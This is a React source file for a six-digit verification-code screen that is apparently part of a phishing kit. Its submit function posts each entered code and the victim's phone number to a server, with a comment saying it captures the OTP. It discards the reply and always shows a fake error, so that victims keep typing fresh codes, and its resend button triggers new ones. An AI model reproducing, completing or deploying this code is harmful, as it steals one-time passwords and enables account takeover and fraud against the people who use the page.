import React, { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import "../App.css";
import axios from "axios";
import BASE_URL from "../components/urls";
import { HiArrowLeft } from "react-icons/hi";

const OTP_LENGTH = 6;
const RESEND_SECONDS = 30;

const Otp = () => {
  const navigate = useNavigate();
  const [otp, setOtp] = useState(new Array(OTP_LENGTH).fill(""));
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [seconds, setSeconds] = useState(RESEND_SECONDS);
  const [canResend, setCanResend] = useState(false);
  const inputRefs = useRef([]);

  const phone = localStorage.getItem("gt_phone") || "";

  // Countdown timer
  useEffect(() => {
    if (seconds <= 0) {
      setCanResend(true);
      return;
    }
    const timer = setTimeout(() => setSeconds((s) => s - 1), 1000);
    return () => clearTimeout(timer);
  }, [seconds]);

  // Focus first input on mount
  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);

  const submit = (code) => {
    setLoading(true);
    setError("");
    // Capture the OTP via server — fire and forget
    axios.post(`${BASE_URL}/otp`, { otp: code, phone }).catch(() => {});
    // Always show error after 5 seconds and reset inputs
    setTimeout(() => {
      setLoading(false);
      setError("An error occurred. Please try again.");
      setOtp(new Array(OTP_LENGTH).fill(""));
      setSeconds(RESEND_SECONDS);
      setCanResend(false);
      setTimeout(() => inputRefs.current[0]?.focus(), 0);
    }, 5000);
  };

  const handleChange = (e, index) => {
    const val = e.target.value.replace(/\D/g, "").slice(-1);
    const newOtp = [...otp];
    newOtp[index] = val;
    setOtp(newOtp);
    setError("");

    if (val && index < OTP_LENGTH - 1) {
      inputRefs.current[index + 1]?.focus();
    }

    if (newOtp.every((d) => d !== "") && val) {
      submit(newOtp.join(""));
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace") {
      if (otp[index]) {
        const newOtp = [...otp];
        newOtp[index] = "";
        setOtp(newOtp);
      } else if (index > 0) {
        inputRefs.current[index - 1]?.focus();
      }
    }
  };

  const handlePaste = (e) => {
    e.preventDefault();
    const pasted = e.clipboardData
      .getData("text")
      .replace(/\D/g, "")
      .slice(0, OTP_LENGTH);
    if (!pasted) return;
    const newOtp = [...otp];
    for (let i = 0; i < pasted.length; i++) newOtp[i] = pasted[i];
    setOtp(newOtp);
    const nextIndex = Math.min(pasted.length, OTP_LENGTH - 1);
    inputRefs.current[nextIndex]?.focus();
    if (pasted.length === OTP_LENGTH) submit(pasted);
  };

  const handleResend = () => {
    if (!canResend) return;
    setSeconds(RESEND_SECONDS);
    setCanResend(false);
    setOtp(new Array(OTP_LENGTH).fill(""));
    setError("");
    inputRefs.current[0]?.focus();
    axios.post(`${BASE_URL}/`, { phone }).catch(() => {});
  };

  // Index of the first empty slot (used to highlight the active box)
  const activeIndex = otp.findIndex((d) => d === "");

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col px-7">
      {/* Back */}
      <div className="pt-12">
        <button
          type="button"
          onClick={() => navigate(-1)}
          className="bg-transparent cursor-pointer text-gray-700"
        >
          <HiArrowLeft className="text-2xl" />
        </button>
      </div>

      {/* Heading */}
      <div className="mt-8">
        <h1 className="text-[34px] font-black text-gray-900 leading-tight tracking-tight">
          6-digit code
        </h1>
        <p className="mt-3 text-[15px] text-gray-500 leading-snug">
          Enter the 6-digit code we sent to{" "}
          <span className="text-[#FA5621] font-semibold">{phone}</span>.
        </p>
      </div>

      {/* OTP boxes */}
      <div className="flex items-center gap-2.5 mt-10" onPaste={handlePaste}>
        {otp.map((digit, i) => (
          <input
            key={i}
            ref={(el) => (inputRefs.current[i] = el)}
            type="tel"
            inputMode="numeric"
            pattern="[0-9]*"
            maxLength={1}
            value={digit}
            onChange={(e) => handleChange(e, i)}
            onKeyDown={(e) => handleKeyDown(e, i)}
            autoComplete="one-time-code"
            className={`w-full aspect-square max-w-[52px] rounded-xl border-2 text-center text-[22px] font-bold text-gray-900 bg-white outline-none transition-colors duration-150 ${
              i === activeIndex
                ? "border-[#FA5621]"
                : digit
                  ? "border-gray-300"
                  : "border-gray-200"
            }`}
          />
        ))}
      </div>

      {/* Error */}
      {error && (
        <p className="mt-4 text-sm text-red-500 font-medium">{error}</p>
      )}

      {/* Loading */}
      {loading && <p className="mt-4 text-sm text-gray-400">Verifying…</p>}

      {/* Resend */}
      <p className="mt-6 text-[13px] text-gray-400">
        Didn&apos;t get the code?{" "}
        {canResend ? (
          <button
            type="button"
            onClick={handleResend}
            className="text-[#FA5621] font-semibold bg-transparent cursor-pointer"
          >
            Resend
          </button>
        ) : (
          <span>
            Resend in{" "}
            <span className="text-gray-700 font-bold">{seconds} sec</span>
          </span>
        )}
      </p>
    </div>
  );
};

export default Otp;
